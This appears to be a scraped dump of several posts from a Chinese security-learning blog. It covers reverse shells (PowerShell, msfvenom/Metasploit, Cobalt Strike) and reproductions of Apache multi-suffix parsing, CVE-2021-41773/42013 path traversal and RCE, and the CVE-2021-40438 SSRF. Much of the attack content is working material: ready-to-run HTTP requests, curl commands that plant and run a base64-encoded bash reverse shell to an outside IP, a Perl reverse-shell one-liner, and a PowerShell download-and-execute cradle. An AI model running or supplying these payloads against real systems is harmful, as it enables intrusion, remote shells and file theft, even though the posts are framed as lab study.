$null);}if ($esread.IsCompleted -and $esread.Result -ne 0) {$r=$es.BaseStream.EndRead($esread);$s.Write($eb,0,$r);$s.Flush();$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);}if ($s.DataAvailable) {$r=$s.Read($nb,0,$nb.Length);if ($r -lt 1) {break;}else{$str=$e.GetString($nb,0,$r);$is.write($str);}}if($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)){break;}if($p.ExitCode -ne $null){break;}} 靶机执行使用powershell执行payload，这里我一直闪退，也找不出什么原因，或许是这种方法被我的靶机识别了吧，这里采用一个生成exe文件的方式来反弹shell msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.137 LPORT=8888 -f exe -o payload.exe 复制payload.exe到Windows机器，然后kali下开启msf使用如下命令监听8888端口： msfconsole //启动msf use exploit/multi/handler //使用msf的侦听模块exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp //设置载荷payload set LHOST 192.168.153.176 //设置本地监听机Ip set LPORT 4444 //设置监听端口 exploit 设置完，在靶机上执行exe即可监听 成功 6. Cobalt strike反弹shell Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvR32等进行反弹shell，类似metasploit的web_delivery模块 运行服务端 ./teamserver 192.168.17.137 123 #123为连接密码 运行客户端： Windows运行cobaltstrike.jar #用户名随便输入 密码123 开启监听: 点击Cobalt Strike-&gt;Listeners payload可选择windows/beacon_http/reverse_http 说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。 这里name随便，ip写服务器端，端口自定义 生成powershell payload: 点击Attack -&gt;Scripted Web Delivery Type选择 powershell payload为 powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.17.137:5566/a'))\" 生成代码已经给出了，在windows上执行 我是在上图位置执行的，不知道其他地方行不行。 不过看见同一电脑上线两次，估计cmd里面执行也可 右键点击interact进入shell，这里ipconfig等命令无法执行，应该是提权才能执行吧，这里不深入了 这次写的反弹shell只是想有一个总体的了解，过程坎坷，不过我们不应该因为步骤复杂或者遇到困难而妥协，在过程中遇到问题解决问题同样可以学到东西。本次文章也有欠缺，不够完美，后续深入学习在继续更新吧。 等等，有强迫症的我，了解了一下为何上述命令无法执行，因为某些命令只是cs自带的，那么ipconfig这种cs就没有，我们需要在前面加入shell即可执行 五、参考文章 反弹shell bash -i命令 反弹shell失败 原来是这个原因 反弹shell的方法总结 [通过shell终端直接打开socket文件进行TCP、UDP通信（转）](https://cnblogs.com/zl1991/p/12524924.html) Linux 反弹 shell 学习 Kali linux zsh shell切换bash shell 上面2-6的文章均为解决/dev/tcp找不到的方法 PowerShell：因为在此系统上禁止运行脚本，解决方法 内网隧道代理技术（六）之 PowerCat反弹Shell msf反弹shell","tags":["基本知识"],"categories":["反弹shell"]},{"title":"Apache HTTPD 多后缀解析漏洞","path":"/2023/09/16/apache-httpd-duo-hou-zhui-jie-xi-lou-dong/","content":"0x01 漏洞描述 Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件： AddType text/html .html AddLanguage zh-CN .cn 其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。 以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器： AddHandler application/x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 0x02 影响版本 与Apache版本无关，与服务器配置有关 AddHandler application/x-httpd-php .php 0x03 漏洞分析 index.php中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。 index.php源码： &lt;?php if (!empty($_FILES)): $ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);//这种取文件名的方式,杜绝了换行符 if (!in_array($ext, ['gif', 'png', 'jpg', 'jpeg'])) { //白名单 die('Unsupported filetype uploaded.'); } $new_name = __DIR__ . '/uploadfiles/' . $_FILES['file_upload']['name'];//设置路径 if(!move_uploaded_file($_FILES['file_upload']['tmp_name'], $new_name)){//上传文件 die('Error uploading file - check destination is writeable.'); } die('File uploaded successfully: ' . $new_name); else: ?&gt; &lt;form method=\"post\" enctype=\"multipart/form-data\"&gt; File: &lt;input type=\"file\" name=\"file_upload\"&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;?php 以gif、png、jpg、jpeg为后缀的文件均可上传成功，将文件保存到/uploadfiles/目录下，上传完成后并未重命名。 查看配置文件： # cat conf/docker-php.conf AddHandler application/x-httpd-php .php DirectoryIndex disabled DirectoryIndex index.php index.html &lt;Directory /var/www/&gt; Options -Indexes AllowOverride All 配置文件中存在AddHandler application/x-httpd-php .php，文件名只要有.php的后缀就会被当成php文件执行。 0x04 漏洞复现 docker启动好之后，访问ip:80 ![image-20230916193303999](Apache HTTPD 多后缀解析漏洞/image-20230916193303999.png) 直接访问http://your-ip/uploadfiles/apache.php.jpeg即可发现，phpinfo被执行了，该文件被解析为php脚本。 ![image-20230916193325731](Apache HTTPD 多后缀解析漏洞/image-20230916193325731.png) 我们接下来正常操作一下，正常上传php文件，Unsupported filetype uploaded ![image-20230916193419902](Apache HTTPD 多后缀解析漏洞/image-20230916193419902.png) 那在后面加上白名单允许的后缀看看 ![image-20230916193524359](Apache HTTPD 多后缀解析漏洞/image-20230916193524359.png) 成功上传，访问试试 ![image-20230916193542496](Apache HTTPD 多后缀解析漏洞/image-20230916193542496.png) 0x05 修复建议 将AddHandler application/x-httpd-php .php的配置文件删除。 0x06 参考文章 【漏洞复现】Apache HTTPD 多后缀解析漏洞 _","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)","path":"/2023/09/16/apache-http-server-2.4.50-zhong-de-lu-jing-bian-li-he-wen-jian-xie-lu-lou-dong-cve-2021-42013/","content":"0x01 漏洞描述 Apache HTTP Server 2.4.50版本对CVE-2021-41773漏洞进行了修复，由于修复不完善，攻击者可绕过补丁，读取web目录之外的文件，在开启cgi模块时，可执行任意命令。 该漏洞影响Apache HTTP Server 2.4.49和2.4.50两个版本，利用条件和CVE-2021-41773相同 0x02 漏洞成因 Apache使用函数 ap_process_request_internal来处理外部请求 AP_DECLARE(int) ap_process_request_internal(request_rec *r) { ..... //调用 ap_normalize_path ，先对字符串进行解码。 if (r-&gt;parsed_uri.path) { /* Normalize: remove /./ and shrink /../ segments, plus * decode unreserved chars (first time only to avoid * double decoding after ap_unescape_url() below). */ if (!ap_normalize_path(r-&gt;parsed_uri.path, normalize_flags | AP_NORMALIZE_DECODE_UNRESERVED)) { ap_log_rerror(APLOG_MARK, APLOG_ERR, 0, r, APLOGNO(10244) \"invalid URI path (%s)\", r-&gt;unparsed_uri); return HTTP_BAD_REQUEST; } } ..... // 再调用 ap_unescape_url，对字符串解码过滤。 /* Ignore URL unescaping for translated URIs already */ if (access_status != DONE &amp;&amp; r-&gt;parsed_uri.path) { core_dir_config *d = ap_get_core_module_config(r-&gt;per_dir_config); if (d-&gt;allow_encoded_slashes) { access_status = ap_unescape_url_keep2f(r-&gt;parsed_uri.path, d-&gt;decode_encoded_slashes); } else { access_status = ap_unescape_url(r-&gt;parsed_uri.path); } if (access_status) { if (access_status == HTTP_NOT_FOUND) { if (! d-&gt;allow_encoded_slashes) { ap_log_rerror(APLOG_MARK, APLOG_INFO, 0, r, APLOGNO(00026) \"found %%2f (encoded '/') in URI path (%s), \" \"returning 404\", r-&gt;unparsed_uri); } } return access_status; } ..... } ..... 开发为了保险起见，反复解码过滤，但是这反而弄巧成拙，造成二次编码注入。 %32e --&gt; %2e --&gt; . %32 = 2 %2e = . ​ 因为该漏洞是在CVE-2021-41773修复的基础上，还会造成路径穿越。这时修复了对.%2e的检测。在处理外部HTTP请求时，会调用ap_process_request_internal函数对url路径进行处理，在该函数中，首先会调用ap_normalize_path函数进行一次url解码，之后会调用ap_unescape_url函数进行二次解码。这时候我们只需要将../url编码两次就行了。 ap_normalize_path函数调用栈如下， 1. 在处理前path参数为/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd 2. 经过`ap_normalize_path`函数处理后path参数变成/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd 3. 经过`unescape_url`函数处理后，可以看到此时的url字符串内容变成/icons/../../../../etc/passwd 补充一下：对于没有进行安全配置的Apache服务器，默认情况可以⽤xxx.com/icons/的方式打开Apache目录下的icons文件夹，并且会罗列出文件列表。 如果我们采用二次编码，这里我认为是第一次解码校验不严谨，随后调用下一个解码函数进行url解码默认为该url已经安全，导致二次编码注入 0x03 漏洞复现 在CVE-2021-41773中使用/.%2e/%2e%2e/%2e%2e进行路径穿越，在2.4.50中已无法使用，但对2e再进行url编码，即%32%65，仍可实现路径穿越 POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1 Host: 192.168.26.103:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: https://fofa.so/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 46 echo Content-Type: text/plain; echo; id; uname ![image-20230916172825780](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916172825780.png) ![image-20230916172906714](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916172906714.png) 写入反弹shell curl -v --data \"echo;echo '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'&gt;&gt; /tmp/shell.sh\" 'http://192.168.17.128:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' ![image-20230916175907480](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916175907480.png) 执行反弹shell curl -v --data \"echo;bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'\" 'http://192.168.17.128:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' ![image-20230916191148783](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916191148783.png) ![image-20230916191338640](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916191338640.png) 这里反弹也花了很大时间，一直不成功，搜了多个文章发现，这里的容器环境/bin/bash指向的dash，但我们用的是bash命令，故此行不通，但那位佬用了bash -c的方法，成功写入并执行。到这里还需注意，若果你用的vps那么厂商的安全组以及宝塔的安全组都要开启，否则不能反弹（我是如此，不知道大家）。 当然这里也能用perl反弹，因为该容器有perl环境 perl -e 'use Socket;$i=\"ip\";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};' 0x04 漏洞修复 2.4.51版本中采用了白名单的机制，在ap_normalize_path中加强了对url编码的校验，只允许数字、字母及特定的符号编码，如果是白名单以外的url编码，就直接报错，不继续搞了 while (path[l] != '\\0') { /* RFC-3986 section 2.3: * For consistency, percent-encoded octets in the ranges of * ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D), * period (%2E), underscore (%5F), or tilde (%7E) should [...] * be decoded to their corresponding unreserved characters by * URI normalizers. */ //就只允许上面注释写到的内容，如果存在这以外的内容，就直接报错。 if (decode_unreserved &amp;&amp; path[l] == '%') { if (apr_isxdigit(path[l + 1]) &amp;&amp; apr_isxdigit(path[l + 2])) { const char c = x2c(&amp;path[l + 1]); if (TEST_CHAR(c, T_URI_UNRESERVED)) { /* Replace last char and fall through as the current * read position */ l += 2; path[l] = c; } } else { /* Invalid encoding */ ret = 0; } } 这里真的是看不懂佬对代码的分析，太难了。。。还是先弄懂原理吧 0x05 检测工具 Apache 2.4.49 (CVE-2021-41773) Apache 2.4.50 (CVE-2021-42013) 批量多线程检测工具： Github地址： https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013 ![image-20230916192049781](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916192049781.png) ![image-20230916192111424](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916192111424.png) 0x06 参考文章 CVE-2021-41773 &amp;&amp; CVE-2021-42013 Apache HTTP Server路径穿越漏洞（CVE-2021-41773、CVE-2021-42013）复现 CVE-2021-42013 Apache HTTP Server 路径穿越漏洞 【Vulfocus解题复现】Apache HTTP Server 路径穿越漏洞（CVE-2021-42013） cve-2021-41773和cve-2021-42013的分析 --值得参考 Apache HTTP Server 2.4.50 路径穿越漏洞 CVE-2021-42013 apache-CVE-2021-41773[42013]-反弹shell 反弹shell的方法总结 Apache 2.4.49 (CVE-2021-41773) 、 2.4.50 (CVE-2021-42013) 检测工具","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Apache HTTP Server 2.4.49 路径穿越漏洞 CVE-2021-41773","path":"/2023/09/16/apache-http-server-2.4.49-lu-jing-chuan-yue-lou-dong/","content":"0x01 漏洞概述 Apache HTTP Server（简称 Apache）是开源的 Web 服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。它快速、可靠并且可通过简单的 API 扩展，将 Perl/Python 等解释器编译到服务器中。 Apache 披露了一个在 Apache HTTP Server 2.4.49 上引入的漏洞，称为 CVE-2021-41773。同时发布了2.4.50更新，修复了这个漏洞。该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文件系统上的任意文件。运行此版本 Apache 的 Linux 和 Windows 服务器都受到影响。此漏洞是在 2.4.49 中引入的，该补丁旨在提高 URL 验证的性能。可以通过对“.”进行编码来绕过新的验证方法。 该漏洞仅影响2.4.49版本，此外还需要在配置文件中允许访问穿越的目录，如&lt;Directory /&gt;Require all granted&lt;/Directory&gt;，使用默认配置的Apache HTTP Server不受影响。 在服务器开启cgi或cgid模块的情况下，该漏洞可执行任意命令。 0x02 漏洞成因 Apache HTTP Server 2.4.49版本使用的ap_normalize_path函数在对路径做过滤的时候没有过滤干净。 ap_normalize_path函数如下 /* * Inspired by mod_jk's jk_servlet_normalize(). */ AP_DECLARE(int) ap_normalize_path(char *path, unsigned int flags) { int ret = 1; apr_size_t l = 1, w = 1; if (!IS_SLASH(path[0])) { /* Besides \"OPTIONS *\", a request-target should start with '/' * per RFC 7230 section 5.3, so anything else is invalid. */ if (path[0] == '*' &amp;&amp; path[1] == '\\0') { return 1; } /* However, AP_NORMALIZE_ALLOW_RELATIVE can be used to bypass * this restriction (e.g. for subrequest file lookups). */ if (!(flags &amp; AP_NORMALIZE_ALLOW_RELATIVE) || path[0] == '\\0') { return 0; } l = w = 0; } // 遍历路径字符串，一边做url解码一边检测 '..'，出现漏洞。 while (path[l] != '\\0') { /* RFC-3986 section 2.3: * For consistency, percent-encoded octets in the ranges of * ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D), * period (%2E), underscore (%5F), or tilde (%7E) should [...] * be decoded to their corresponding unreserved characters by * URI normalizers. */ // 这一段是在做URL解码 // 检测到当前位为‘%’，接下来两位为十六进制数字就进入if if ((flags &amp; AP_NORMALIZE_DECODE_UNRESERVED) &amp;&amp; path[l] == '%' &amp;&amp; apr_isxdigit(path[l + 1]) &amp;&amp; apr_isxdigit(path[l + 2])) { const char c = x2c(&amp;path[l + 1]); // 将url编码转换为字符（16进制转char） if (apr_isalnum(c) || (c &amp;&amp; strchr(\"-._~\", c))) { /* Replace last char and fall through as the current * read position */ l += 2; path[l] = c; } } if ((flags &amp; AP_NORMALIZE_DROP_PARAMETERS) &amp;&amp; path[l] == ';') { do { l++; } while (!IS_SLASH_OR_NUL(path[l])); continue; } // 如果path[0]不是斜杠，且不是* 或者空串，w就会置为0。 // 如果w = 0 或者 paht[0]是斜杠，就进入循环。 if (w == 0 || IS_SLASH(path[w - 1])) { /* Collapse ///// sequences to / */ //跳过连续的斜杠 if ((flags &amp; AP_NORMALIZE_MERGE_SLASHES) &amp;&amp; IS_SLASH(path[l])) { do { l++; } while (IS_SLASH(path[l])); continue; } //如果检测到点号 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ // 如果点号的下一个还是点号，就要删一点了 if (path[l + 1] == '.' &amp;&amp; IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w &gt; 1) { do { w--; } while (w &amp;&amp; !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags &amp; AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } } path[w++] = path[l++]; } path[w] = '\\0'; return ret; } 可以看到，漏洞的产生原因是其遍历一整个路径字符串，对每一位，先进行url解码，然后检测是不是当前位和下一位的组合是不是两个点.. 他能检测出的情况如下 .. %2e. // 正在处理第一位，解码后发现是..组合 然而如果遇到这种情况 .%2e // 解码第一位，仍然是.%2e，没有检测到..组合 %2e%2e // 解码第一位，解成.%2e，仍然无法检测到..组合 0x03 漏洞复现 启动后，访问环境ip 8080端口看到“It Works!”表明环境启动成功 发送以下payload成功读取/etc/passwd文件 /icons/目录是一个存在且可访问的目录，测试时也可改为其他目录如/cgi-bin/，但在本环境中/cgi-bin/目录访问状态码为403，因此使用了/icons/目录 GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd Host: 192.168.26.103:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ![image-20230916163701796](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916163701796.png) 执行命令 POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh Host: 192.168.26.103:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 46 echo Content-Type: text/plain; echo; id; uname ![image-20230916163905857](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916163905857.png) 0x04 漏洞修复 1）41773——2.4.50版本对ap_normalize_path函数进行修改，补充了如下代码，对.%2e的绕过形式进行了判断，可以避免使用该方法绕过。 if ((path[n] == '.' || (decode_unreserved &amp;&amp; path[n] == '%' &amp;&amp; path[++n] == '2' &amp;&amp; (path[++n] == 'e' || path[n] == 'E'))) &amp;&amp; IS_SLASH_OR_NUL(path[n + 1])) { /* Wind w back to remove the previous segment */ if (w &gt; 1) { do { w--; } while (w &amp;&amp; !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags &amp; AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l = n + 1; if (path[l]) { l++; } continue; }&lt;br&gt;————https://xz.aliyun.com/t/10359?page=1 2）42013——2.4.51版本针对该漏洞进行了多处修改，最核心的一处修改是在ap_normalize_path函数中加强了对url编码的校验，如果检测到存在非标准url编码（%+两个十六进制字符）的情况，就返回编码错误，从根本上杜绝了多重编码可能导致的绕过，修复代码如下： while (path[l] != '\\0') { /* RFC-3986 section 2.3: * For consistency, percent-encoded octets in the ranges of * ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D), * period (%2E), underscore (%5F), or tilde (%7E) should [...] * be decoded to their corresponding unreserved characters by * URI normalizers. */ if (decode_unreserved &amp;&amp; path[l] == '%') { if (apr_isxdigit(path[l + 1]) &amp;&amp; apr_isxdigit(path[l + 2])) { const char c = x2c(&amp;path[l + 1]); if (TEST_CHAR(c, T_URI_UNRESERVED)) { /* Replace last char and fall through as the current * read position */ l += 2; path[l] = c; } } else { /* Invalid encoding */ ret = 0; } }————https://xz.aliyun.com/t/10359?page=1 0x05 POC利用 项目地址参考： https://github.com/lorddemon/CVE-2021-41773-PoC/ https://github.com/0xAlmighty/CVE-2021-41773-PoC 这里推荐第二个，因为我第一个没成功 ![image-20230916170222150](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916170222150.png) ![image-20230916170230540](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916170230540.png) 不过在利用第二个的时候如果在明确有漏洞但仍未利用的，那需要大家去py修改一些内容，比如端口，或者穿越路径时的%2e的数量等等 0x06 参考文章 [CVE-2021-41773(42013) Apache HTTP Server路径穿越漏洞复现] CVE-2021-41773 Apache HTTP Server路径遍历漏洞0day Apache HTTP Server路径穿越漏洞（CVE-2021-41773、CVE-2021-42013）复现 Apahce HTTPd 2.4.49（CVE-2021-41773）漏洞复现详细教程","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)","path":"/2023/09/16/apache-http-fu-wu-qi-2.4.48-mod-proxy-ssrf-cve-2021-40438/","content":"0x01 前言 又是一篇漏洞复现，虽然我至今复现了许多CVE漏洞，但心中总是感觉缺少点什么，复现的时候看到那些大佬的分析方法，步骤及思路，让我叹为观止（这令我产生了一种“错觉”？漏洞复现本就是深入底层代码去分析漏洞原理吗？）当然很明显本就应该这样做，但对于新手的我来说，这种方法却似乎成为了一堵高墙，我在想我究竟是要跟着大佬去代码世界走一遭还是单纯理解漏洞如何产生，影响范围，如何利用就好了。 虽然目前心中还是没有明确答案，但我似乎应该清醒一些，那些佬一定有着深厚的功底，因此这些复现的技术方法本就是他们的基操，而对于目前新手的我来说，面对如此庞大的代码量，且菜鸡的我目前为止，对于一些简单的代码程序的普通调试，也没有熟练甚至很菜。因此我认为我这或许潜移默化中形成了–眼高手低–的心理吗？ 但不论如何说，什么能力办什么事，因此我目前为止对于此种漏洞的态度为，尽自己最大能力搞清楚原理，跟着大佬的思路走上一遭，哪怕记不住，但或许对自己代码审计能力也能提高一些，故此没必要焦虑，只希望自己在日后有能力之后，可以蓦然回首，遨游于代码世界。 上述也是发表了一下心中的小小感慨，但还是不够彻底，不过想起一句话，在自己目前认为什么也想干但却不知干什么，或者甚至什么也不想做，那也要在自己热爱的方面一直学下去，或许哪一篇文章，哪一句话，哪一个人，就给了你奇思妙想的思路。。。。不多说了，开始学习。 0x02 前置知识 这里呢就跟着佬的思路走一遍，过点脑子即可。 Apache Module综述 如果我们要部署一个PHP运行环境，且将Apache作为Web应用服务器，那么常用的有三种方法： Apache以CGI的形式运行PHP脚本 PHP以mod_php的方式作为Apache的一个模块运行 PHP以FPM的方式运行为独立服务，Apache使用mod_proxy_fcgi模块作为反代服务器将请求代理给PHP-FPM 第一种方式比较古老，性能较差，基本已经淘汰；第二种方式在Apache环境下使用较广，配置最为简单；第三种方法也有较大用户体量，不过Apache仅作为一个中间的反代服务器，更多新的用户会选择使用性能更好的Nginx替代。 这其中，第三种方法使用的mod_proxy_fcgi就是本文主角mod_proxy模块的一个子模块。mod_proxy是Apache服务器中用于反代后端服务的一个模块，而它拥有数个不同功能的子模块，分别用于支持不同通信协议的后端，比如常见的有： mod_proxy_fcgi 用于反代后端是fastcgi协议的服务，比如php-fpm mod_proxy_http 用于反代后端是http、https协议的服务 mod_proxy_uwsgi 用于反代后端是uwsgi协议的服务，主要针对uWSGI mod_proxy_ajp 用于反代后端是ajp协议的服务，主要针对Tomcat mod_proxy_ftp 用于反代后端是ftp协议的服务 除去mod_proxy_fcgi用于反代PHP，我们在使用Node.js、Python等脚本语言编写的应用也常常会使用mod_proxy_http作为一层反代服务器，这样中间层可以做ACL、静态文件服务等。 这次的SSRF漏洞是出在mod_proxy这个模块中的，我们就来从代码的层面分析一下它的原理是什么，究竟影响有多大。 0x03 漏洞原理分析 《Building a POC for CVE-2021-40438》这篇文章中提到了这个漏洞的复现方法：当目标环境使用了mod_proxy做反向代理，比如ProxyPass / \"http://localhost:8000/\"，此时通过请求http://target/?unix:{'A'*5000}|http://example.com/即可向http://example.com发送请求，造成一个SSRF攻击。 这里面，Apache代码中犯得错误是在modules/proxy/proxy_util.c的fix_uds_filename函数： /* * In the case of the reverse proxy, we need to see if we * were passed a UDS url (eg: from mod_proxy) and adjust uds_path * as required. */ static void fix_uds_filename(request_rec *r, char **url) { char *ptr, *ptr2; if (!r || !r-&gt;filename) return; if (!strncmp(r-&gt;filename, \"proxy:\", 6) &amp;&amp; (ptr2 = ap_strcasestr(r-&gt;filename, \"unix:\")) &amp;&amp; (ptr = ap_strchr(ptr2, '|'))) { apr_uri_t urisock; apr_status_t rv; *ptr = '\\0'; rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock); if (rv == APR_SUCCESS) { char *rurl = ptr+1; char *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path); apr_table_setn(r-&gt;notes, \"uds_path\", sockpath); *url = apr_pstrdup(r-&gt;pool, rurl); /* so we get the scheme for the uds */ /* r-&gt;filename starts w/ \"proxy:\", so add after that */ memmove(r-&gt;filename+6, rurl, strlen(rurl)+1); ap_log_rerror(APLOG_MARK, APLOG_TRACE2, 0, r, \"*: rewrite of url due to UDS(%s): %s (%s)\", sockpath, *url, r-&gt;filename); } else { *ptr = '|'; } } } Apache在配置反代的后端服务器时，有两种情况： 直接使用某个协议反代到某个IP和端口，比如ProxyPass / \"http://localhost:8080\" 使用某个协议反代到unix套接字，比如ProxyPass / \"unix:/var/run/www.sock|http://localhost:8080/\" 第一种情况比较好理解，第二种情况的设计我觉得不是很好，相当于让用户可以使用一个Apache自创的写法来配置后端地址。那么这时候就会涉及到parse的过程，需要将这种自创的语法转换成能兼容正常socket连接的结构，而fix_uds_filename函数就是做这个事情的。 使用字符串文法来表示多种含义的方式通常暗藏一些漏洞，比如这里，进入这个if语句需要满足三个条件： r-&gt;filename的前6个字符等于proxy: r-&gt;filename的字符串中含有关键字unix: unix:关键字后的部分含有字符| 当满足这三个条件后，将unix:后面的内容进行解析，设置成uds_path的值；将字符|后面的内容，设置成rurl的值。 举个例子，前面介绍中的ProxyPass / \"unix:/var/run/www.sock|http://localhost:8080/\"，在解析完成后，uds_path的值等于/var/run/www.sock，rurl的值等于http://localhost:8080/。 这里上一个GPT解释： 这段代码是 C 语言代码，用于 Apache HTTP 服务器的模块开发。该代码位于一个函数 `fix_uds_filename` 中，用于处理反向代理（reverse proxy）中的请求，特别是在处理传递了 UDS（Unix Domain Socket）URL 的情况下。 以下是对该代码的分析： 1. `fix_uds_filename` 函数是一个静态函数，它接受两个参数：`request_rec *r` 和 `char **url`。`request_rec` 是 Apache HTTP 服务器处理请求时的核心数据结构，而 `char **url` 是一个指向指针的指针，用于传递 URL。 2. 函数开始的注释解释了它的目的，即在反向代理中，检查是否传递了 UDS URL（例如来自 mod_proxy 模块），并根据需要调整 UDS 路径。 3. 接下来，代码对输入参数进行了一些基本的有效性检查，确保 `r` 和 `r-&gt;filename` 不为空。如果为空，函数就会直接返回，不执行后续操作。 4. 接下来，代码检查 `r-&gt;filename` 是否以 \"proxy:\" 开头，并且是否包含 \"unix:\" 和 \"|\"。这些条件用于识别传递的 UDS URL。 5. 如果满足条件，代码会使用 Apache 的函数 `ap_strcasestr` 和 `ap_strchr` 来分析 URL，并解析其中的 UDS 路径。 6. 一旦成功解析 UDS 路径，代码会将其存储在 `apr_table_t` 数据结构中的 \"uds_path\" 键下，并将 UDS URL 的剩余部分存储在 `url` 指针所指向的位置。 7. 接下来，代码更新 `r-&gt;filename`，将 \"proxy:\" 后面的部分替换为解析出的 UDS URL。 8. 最后，代码使用 `ap_log_rerror` 函数记录一条日志，指示已经因为 UDS URL 的存在而重写了 URL。 总之，这段代码的主要目的是在处理反向代理请求时，检查传递的 URL 是否包含 UDS 部分，如果包含，则解析出 UDS 路径，并进行一些必要的更新和日志记录。这有助于在反向代理中正确处理使用 Unix 域套接字的情况。 这里我们先搞清楚代码是干什么的即可。 看到这里其实都没有什么问题，那么我们肯定会思考，r-&gt;filename是从哪来的，用户可控吗，为什么？ 这时就要说到另一个函数，proxy_hook_canon_handler，这个函数用于注册canon 